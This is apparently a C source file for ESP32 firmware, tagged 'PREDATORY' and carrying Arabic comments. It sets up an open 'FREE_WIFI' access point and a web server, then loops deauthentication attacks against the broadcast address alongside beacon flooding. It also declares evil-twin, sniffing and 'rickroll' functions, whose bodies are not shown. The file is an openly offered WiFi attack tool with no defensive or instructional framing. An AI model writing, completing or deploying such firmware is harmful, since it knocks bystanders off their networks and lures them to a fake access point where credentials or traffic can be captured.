#include <stdio.h>
#include <string.h>
#include "freertos/FreeRTOS.h"
#include "freertos/task.h"
#include "esp_wifi.h"
#include "esp_event.h"
#include "nvs_flash.h"
#include "esp_netif.h"
#include "esp_log.h"

static const char *TAG = "PREDATORY";

void deauth_attack(uint8_t *bssid);
void beacon_flood(char *ssid);
void start_sniffing(void);
void evil_twin_start(char *target_ssid);
void rickroll_start(void);
void start_web_server(void);

// متغير للتحكم في الهجمات
int attacks_running = 1;

void attack_loop(void *pv) {
    ESP_LOGI(TAG, "Attack loop started!");
    while(attacks_running) {
        uint8_t bssid[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
        deauth_attack(bssid);
        beacon_flood("FREE_WIFI");
        vTaskDelay(1500 / portTICK_PERIOD_MS);  // تأخير أطول لتقليل الضغط
    }
}

void start_ap(void) {
    ESP_LOGI(TAG, "Configuring AP...");
    
    // إعدادات محسنة للاتصال
    wifi_config_t ap_config = {
        .ap = {
            .ssid = "FREE_WIFI",
            .ssid_len = 9,
            .password = "",
            .channel = 1,              // قناة أقل ازدحاماً
            .authmode = WIFI_AUTH_OPEN,
            .max_connection = 4,
            .beacon_interval = 100,    // زيادة سرعة البث
        },
    };
    
    ESP_LOGI(TAG, "Setting mode to AP...");
    esp_wifi_set_mode(WIFI_MODE_AP);
    
    ESP_LOGI(TAG, "Setting config...");
    esp_wifi_set_config(WIFI_IF_AP, &ap_config);
    
    ESP_LOGI(TAG, "Starting WiFi...");
    esp_wifi_start();
    
    ESP_LOGI(TAG, "AP Started: FREE_WIFI on channel 1");
}

void app_main(void) {
    ESP_LOGI(TAG, "=== APP STARTING ===");
    
    // تهيئة NVS
    esp_err_t ret = nvs_flash_init();
    if (ret == ESP_ERR_NVS_NO_FREE_PAGES || ret == ESP_ERR_NVS_NEW_VERSION_FOUND) {
        ESP_LOGI(TAG, "Erasing NVS...");
        ESP_ERROR_CHECK(nvs_flash_erase());
        ret = nvs_flash_init();
    }
    ESP_ERROR_CHECK(ret);
    ESP_LOGI(TAG, "NVS OK");
    
    // تهيئة الشبكة
    ESP_LOGI(TAG, "Initializing netif...");
    ESP_ERROR_CHECK(esp_netif_init());
    ESP_LOGI(TAG, "netif OK");
    
    ESP_LOGI(TAG, "Creating event loop...");
    ESP_ERROR_CHECK(esp_event_loop_create_default());
    ESP_LOGI(TAG, "event loop OK");
    
    // تهيئة WiFi
    ESP_LOGI(TAG, "Initializing WiFi...");
    wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
    ESP_ERROR_CHECK(esp_wifi_init(&cfg));
    ESP_LOGI(TAG, "WiFi OK");
    
    // تشغيل AP
    ESP_LOGI(TAG, "Starting AP...");
    start_ap();
    ESP_LOGI(TAG, "AP started");
    
    // تشغيل خادم الويب
    ESP_LOGI(TAG, "Starting web server...");
    start_web_server();
    ESP_LOGI(TAG, "Web server started");
    
    // تأخير طويل للتأكد من استقرار AP
    ESP_LOGI(TAG, "Waiting 5 seconds for AP to stabilize...");
    vTaskDelay(5000 / portTICK_PERIOD_MS);
    
    // تشغيل الهجمات ولكن بتأخير أطول
    ESP_LOGI(TAG, "Starting attack loop...");
    xTaskCreate(attack_loop, "attack_loop", 4096, NULL, 5, NULL);
    
    ESP_LOGI(TAG, "=== SYSTEM READY ===");
    ESP_LOGI(TAG, "Connect to FREE_WIFI and visit 192.168.4.1");
}
